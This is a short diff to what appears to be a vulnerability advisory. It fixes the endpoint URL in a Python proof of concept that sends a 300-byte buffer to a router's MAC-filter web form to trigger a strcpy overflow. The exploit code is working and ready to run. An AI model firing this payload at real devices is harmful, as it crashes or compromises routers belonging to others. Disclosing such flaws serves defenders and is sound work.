@@ -37,7 +37,7 @@ finally call strcpy ,cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetMacFilterCfg"
+url = "http://192.168.1.13/goform/SetMacFilterCfg"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'deviceList': payload , 'macFilterType': 1 })
